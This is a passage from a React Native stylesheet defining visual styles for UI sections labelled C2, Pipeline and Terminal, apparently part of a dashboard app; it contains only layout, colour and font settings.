  toolChip: { paddingHorizontal: 10, paddingVertical: 5, borderRadius: 10, borderWidth: 1 },
  toolChipText: { fontSize: 11, fontFamily: 'monospace', fontWeight: '600' },
  // C2
  c2Header: { padding: 12, backgroundColor: '#6d28d918', borderRadius: 12, borderWidth: 1, borderColor: '#6d28d940', marginBottom: 4 },
  c2Title: { color: '#a78bfa', fontSize: 13, fontWeight: '700', letterSpacing: 2 },
  c2Sub: { color: colors.textDim, fontSize: 11, marginTop: 2 },
  c2Card: { borderRadius: 12, padding: 14, borderWidth: 1, gap: 10 },
  c2CardTop: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  c2Icon: { fontSize: 24 },
  c2Name: { fontSize: 13, fontWeight: '700' },
  c2Port: { color: colors.textDim, fontSize: 11 },
  c2Dot: { width: 10, height: 10, borderRadius: 5 },
  c2Actions: { flexDirection: 'row', gap: 8 },
  c2Btn: { flex: 1, paddingVertical: 8, borderRadius: 8, borderWidth: 1, alignItems: 'center' },
  c2BtnText: { fontSize: 12, fontWeight: '700', fontFamily: 'monospace' },
  c2LogBtn: { paddingHorizontal: 14, paddingVertical: 8, borderRadius: 8, borderWidth: 1, borderColor: colors.border },
  c2LogBtnText: { color: colors.textMuted, fontSize: 12 },
  // Pipeline
  pipeHeader: { backgroundColor: '#f9731618', borderRadius: 12, padding: 12, borderWidth: 1, borderColor: '#f9731630' },
  pipeTitle: { color: '#f97316', fontSize: 13, fontWeight: '700', letterSpacing: 2 },
  pipeSub: { color: colors.textDim, fontSize: 11, marginTop: 2 },
  pipeStageWrap: { gap: 0 },
  pipeStage: {
    flexDirection: 'row', alignItems: 'center', gap: 12,
    backgroundColor: '#f9731618', borderRadius: 12, padding: 14,
    borderWidth: 1, borderColor: '#f9731640',
  },
  pipeStageOff: { opacity: 0.4 },
  pipeIcon: { fontSize: 24 },
  pipeLabel: { color: '#f97316', fontSize: 14, fontWeight: '700' },
  pipeDesc: { color: colors.textDim, fontSize: 11, fontFamily: 'monospace' },
  pipeArrow: { color: '#f97316', fontSize: 16 },
  pipeConnector: { alignItems: 'center', paddingVertical: 4 },
  pipeConnectorText: { color: '#f9731650', fontSize: 18 },
  pipeHint: { backgroundColor: '#ffd70018', borderRadius: 10, padding: 12, borderWidth: 1, borderColor: '#ffd70040' },
  pipeHintText: { color: colors.yellow, fontSize: 12 },
  // Terminal
  termWrap: { gap: 8 },
  termHeader: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  termLabel: { color: colors.textDim, fontSize: 11, letterSpacing: 2, fontWeight: '700' },
  termRunning: { color: '#f97316', fontSize: 11 },
  clearBtn: { marginLeft: 'auto', paddingHorizontal: 10, paddingVertical: 5, borderRadius: 6, borderWidth: 1, borderColor: colors.border },
  clearBtnText: { color: colors.textMuted, fontSize: 11 },
  termScroll: { backgroundColor: '#00000080', borderRadius: 10, borderWidth: 1, borderColor: '#ffffff10', maxHeight: 400 },
  termText: { color: '#7fffb0', fontSize: 12, fontFamily: 'monospace', padding: 12, lineHeight: 18 },
});
